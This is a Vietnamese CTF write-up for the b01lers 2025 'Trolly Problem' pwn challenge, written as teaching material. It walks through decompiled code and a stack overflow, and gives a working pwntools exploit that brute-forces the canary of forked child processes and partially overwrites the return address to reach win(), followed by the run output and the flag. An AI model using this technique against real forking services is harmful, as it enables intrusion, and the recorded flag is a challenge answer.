---
title: '[Writeup] - b01lers CTF (2025) - PWN'
tag: ['PWN', 'Writeup']
top_img: /img/2025/b01lers/banner.png
cover: /img/2025/b01lers/banner.png
category: ['Writeup', 'PWN']
date: 2025-04-22 00:14:00
author:
    - d4kw1n
---

## Trolly Problem

### Challenge Description

![alt text](/img/2025/b01lers/image.png)

### Analysis & Source code

1. Checksec

```bash
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

2. Source code

Bài này không có source code sẵn nên mình sẽ dùng IDA để đọc mã nguồn. Challenge này sẽ có 3 functions chính cần chú ý là **main()**, **trolley_problem()**, **win()**

- **main()**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int stat_loc; // [rsp+4h] [rbp-Ch] BYREF
  __pid_t pid; // [rsp+8h] [rbp-8h]
  int v6; // [rsp+Ch] [rbp-4h]

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  while ( problems > 0 )
  {
    --problems;
    pid = fork();
    if ( !pid )
      return trolley_problem();
    waitpid(pid, &stat_loc, 0);
    v6 = BYTE1(stat_loc);
    if ( BYTE1(stat_loc) == 1 || v6 == 5 )
    {
      problems += v6;
      puts("Uh oh, here comes another trolley...");
    }
  }
  return 0;
}
```

- **trolley_problem()**

```c
__int64 trolley_problem()
{
  int i; // [rsp+4h] [rbp-2Ch]
  char *s; // [rsp+8h] [rbp-28h]
  char s1[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  puts(::s);
  puts("Oh no! A runaway trolley is heading down the track");
  puts("and is about to cause five more trolley problems.");
  puts("You can pull a lever to divert the trolley onto another track,");
  puts("where it will only cause one trolley problem. What do you do?");
  s = (char *)malloc(0x64uLL);
  fgets(s, 48, stdin);
  for ( i = 0; s[i] != 10; ++i )
    s1[i] = s[i];
  puts(::s);
  if ( !strncmp(s1, "pull the lever", 0xEuLL) )
  {
    puts("You pulled the lever. But what did it accomplish?");
    return 1LL;
  }
  else
  {
    puts("You did nothing. Isn't that the wrong choice though?");
    return 5LL;
  }
}
```

- **win()**

```c
void __noreturn win()
{
  FILE *stream; // [rsp+8h] [rbp-78h]
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v2; // [rsp+78h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    puts("flag.txt not found");
    exit(1);
  }
  fgets(s, 100, stream);
  puts(s);
  fclose(stream);
  exit(0);
}
```

Function **win()** được dùng để in ra Flag cho chúng ta. Tuy nhiên nó lại không được call đến => Nên mình suy nghĩ đây là một bài **ret2win**.

Ở đây sẽ có 3 vấn đề cần giải quyết là `BOF ở đâu?`, `Canary` và `PIE`

- Về câu hỏi `BOF ở đâu?`
  - Trong hàm **trolley_problem()**, biến **s1** được khai báo 24 phần tử. Tuy nhiên, chương trình lại cho phép nhập đến tận 48 ký tự. => BOF sẽ xảy ra ở đây.
- Về phần `Canary`
  - Trong function **main()**, hàm **trolley_problem()** được gọi trong tiến trình con bởi việc dùng function **fork()** -> Canary mỗi tiến trình con là như nhau => Brute force canary.
  - Đồng thời, phải đảm bảo vòng lặp while không bị thoát. Để làm được điều này thì mình cần phải tăng giá trị của biến problems lên một giá trị thích hợp. Đoạn code bên dưới sẽ làm việc này
  
```python
for _ in range(256):  
    p.sendlineafter(b"What do you do?\n", b"do nothing")
    p.recvuntil(b"Uh oh, here comes another trolley...")
```

- Về phần `PIE`
  - Do PIE bật nên chúng ta không thể nhảy thẳng đến địa chỉ của function `win()` do không biết địa chỉ chính xác => Chỉ cần ghi đè 2 byte cuối.

Sau khi giải quyết được hết vấn đề thì bắt tay vào phần exploit

### Exploit

```python
from pwn import *

p = process('./chall') 
# p = remote('trolley-problem.harkonnen.b01lersc.tf', 8443, ssl=True)
exe = ELF('./chall') 
for _ in range(256):  
    p.sendlineafter(b"What do you do?\n", b"do nothing")
    p.recvuntil(b"Uh oh, here comes another trolley...")



canary = b""
for i in range(8): 
     for b in range(0xff + 1): 
          if b == 0x0a:
               continue
          p.recvuntil(b"What do you do?\n")
          
          payload = b"a" * 24 + canary + bytes([b])

          p.sendline(payload)
          p.recvline()
          p.recvline()
          response = p.recvline()
          if b"detected ***" not in response: 
               canary += bytes([b])
               log.info(f"Canary byte {i+1}: {hex(b)}")
               break

canary = u64(canary.ljust(8, b"\x00")) 
log.info(f"Canary: {hex(canary)}")

for i in range(256):
     payload = b"A" * 24 + p64(canary) + b"B" * 8 + b"\xD6" + bytes([i]) 
     p.sendlineafter(b"What do you do?\n", payload)
     res = p.recvuntil(b"}", timeout=1)
     if b"bctf" in res:
          log.info(f"Flag: {res}")
          break
     
p.interactive()
```

### Get Flag

```bash
┌──(kali㉿ANONYMOUS)-[/mnt/d/Security/PeginWN/Challenge/b01lersc/trolley-problem/trolley-problem/src]
└─$ python3 sol.py 
[+] Opening connection to trolley-problem.harkonnen.b01lersc.tf on port 8443: Done
[*] '/mnt/d/Security/PeginWN/Challenge/b01lersc/trolley-problem/trolley-problem/src/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
[*] Canary byte 1: 0x0
[*] Canary byte 2: 0x72
[*] Canary byte 3: 0x3f
[*] Canary byte 4: 0xc5
[*] Canary byte 5: 0xdd
[*] Canary byte 6: 0x5d
[*] Canary byte 7: 0x33
[*] Canary byte 8: 0xaa
[*] Canary: 0xaa335dddc53f7200
[*] Flag: b"\nYou did nothing. Isn't that the wrong choice though?\nbctf{why_c4nt_th3_tr0113y_dr1v3r_ju5t_pu11_th3_3m3rg3ncy_br4k3_5mh}"
[*] Switching to interactive mode
```

🚩 Flag: bctf{why_c4nt_th3_tr0113y_dr1v3r_ju5t_pu11_th3_3m3rg3ncy_br4k3_5mh}

